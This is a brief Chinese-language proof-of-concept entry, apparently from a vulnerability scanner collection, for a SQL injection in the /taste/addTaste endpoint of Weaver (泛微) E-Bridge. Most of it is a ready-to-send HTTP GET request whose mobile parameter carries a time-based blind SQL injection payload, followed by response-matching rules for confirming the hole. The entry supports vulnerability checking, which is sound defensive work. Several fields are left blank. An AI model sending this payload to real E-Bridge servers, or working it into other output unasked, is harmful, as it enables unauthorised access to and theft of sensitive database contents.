﻿# 泛微 E-Bridge addTaste SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：上海泛微网络科技股份有限公司云桥e-Bridge /addTaste 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111%27%20AND%20(SELECT%207604%20FROM%20(SELECT(SLEEP(1)))ZQXL)--%20YAby HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?FILTERED)(?=.*?true).*?$

> 上传文件定位：

> 验证文件来源：泛微 E-Bridge addTaste SQL注入漏洞.poc
